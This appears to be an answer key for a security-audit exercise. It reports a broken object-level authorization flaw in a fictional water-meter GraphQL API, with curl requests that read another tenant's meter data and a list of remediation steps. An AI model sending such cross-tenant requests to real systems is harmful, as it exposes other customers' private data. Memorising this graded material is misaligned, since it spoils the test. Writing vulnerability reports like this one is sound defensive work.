# Expected Response

## System
- Domain: Water Utilities / Smart Metering
- System: AquaGrid Meter Management
- Example ID: GQL-0089

## Priority Findings

### Finding 1: Water Meter BOLA — ID in Path Without Ownership Check Enables Cross-Tenant Usage Data Access (Pattern 1.1)
**Severity:** Critical
**Category:** BOLA

**Summary:**
Per §5.0 (Pattern 1.1 — ID in path without ownership check): The `listResources` resolver trusts client-supplied `tenantId` instead of using the JWT. An attacker from `tenant-e12c` passed `tenantId: "tenant-c9b9"` to enumerate water meter records belonging to another utility consumer. In smart water grid infrastructure, this exposes metering data, consumption patterns, leak alerts, and billing information that are regulated under utility privacy frameworks.

**Evidence from HAR:**
- Request: `POST https://api.aquagrid-meter-mana.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-e12c`
- Query: `listResources(tenantId: "tenant-c9b9") { resourceId ownerId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-c9b9"`, `ownerId: "other-user-e12cc9b9"`, `sensitiveField: "CONFIDENTIAL-e12cc9b9"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-e12cc9b9`

## Steps to Reproduce

### Step 1 — Cross-tenant water meter list (HAR)
```bash
curl -s -X POST https://api.aquagrid-meter-mana.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-e12c" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-c9b9\") { resourceId ownerId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-e12cc9b9` from `tenant-c9b9`. **Secure:** FORBIDDEN.

### Step 2 — Direct ID substitution
```bash
curl -s -X POST https://api.aquagrid-meter-mana.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-e12c" \
  -d '{"query": "query { getResource(id: \"R-2089\") { resourceId tenantId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Direct ID access returns victim meter data.

## Remediation
1. `listResources` must use JWT `tenantId` — discard client argument.
2. Resolver tenant guard: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
3. Redis cache key: `resource:{tenantId}:{resourceId}`.
